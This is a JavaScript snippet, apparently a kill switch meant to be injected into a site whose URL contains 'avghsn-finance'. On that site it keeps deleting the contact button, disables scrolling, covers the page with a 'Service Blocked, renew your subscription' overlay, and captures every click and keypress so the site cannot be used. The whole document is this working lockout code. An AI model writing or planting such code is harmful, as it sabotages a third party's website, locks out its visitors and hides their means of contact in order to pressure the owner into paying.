(function () {
    const targetKeyword = "avghsn-finance";

    // Check URL
    if (!window.location.href.includes(targetKeyword)) return;

    // 🔥 Remove Contact Button (adjust selector if needed)
    function removeContactButton() {
        const btn =
            document.querySelector(".contact-btn") ||
            document.querySelector("#contact") ||
            document.querySelector("[href*='contact']");

        if (btn) {
            btn.remove();
        }
    }

    // Run multiple times (handles dynamic rendering frameworks)
    setInterval(removeContactButton, 1000);

    // Disable scrolling
    document.body.style.overflow = "hidden";

    // Create overlay
    const overlay = document.createElement("div");
    overlay.id = "service-block-overlay";

    overlay.innerHTML = `
        <div class="block-box">
            <div class="icon">🚫</div>
            <h1>Service Blocked</h1>
            <p>No renewal has been made.</p>
            <p>Please renew your subscription to continue.</p>
        </div>
    `;

    // Styles
    const style = document.createElement("style");
    style.innerHTML = `
        #service-block-overlay {
            position: fixed;
            inset: 0;
            width: 100%;
            height: 100%;
            background: rgba(10, 10, 25, 0.9);
            backdrop-filter: blur(10px);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 999999;
            font-family: 'Segoe UI', sans-serif;
        }

        .block-box {
            text-align: center;
            padding: 40px;
            border-radius: 16px;
            background: rgba(255,255,255,0.05);
            color: white;
            box-shadow: 0 10px 40px rgba(0,0,0,0.4);
            animation: fadeIn 0.4s ease;
        }

        .icon {
            font-size: 50px;
            margin-bottom: 10px;
        }

        h1 {
            font-size: 26px;
            margin-bottom: 10px;
        }

        p {
            opacity: 0.8;
            margin: 5px 0;
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: scale(0.95);
            }
            to {
                opacity: 1;
                transform: scale(1);
            }
        }
    `;

    document.head.appendChild(style);
    document.body.appendChild(overlay);

    // 🔒 Block all user interaction
    document.addEventListener(
        "click",
        function (e) {
            e.stopPropagation();
            e.preventDefault();
        },
        true
    );

    document.addEventListener("keydown", function (e) {
        e.preventDefault();
    });

})();
